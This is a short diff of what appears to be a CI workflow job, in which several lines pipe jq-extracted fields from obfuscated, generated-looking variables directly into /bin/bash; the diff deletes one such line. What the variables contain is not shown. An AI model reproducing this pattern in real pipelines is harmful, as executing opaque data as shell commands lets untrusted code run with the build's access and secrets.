@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$dnt6193" | jq -r .zp872 | /bin/bash
           printf '%s' "$vw69" | jq -r .v878 | /bin/bash
           echo $xe57300 | jq -r .sue5174 | /bin/bash
-          printf '%s' "$b80973" | jq -r .vcnb31379 | /bin/bash
           echo $znvbb064 | jq -r .dty52 | /bin/bash
 
       - name: Save results
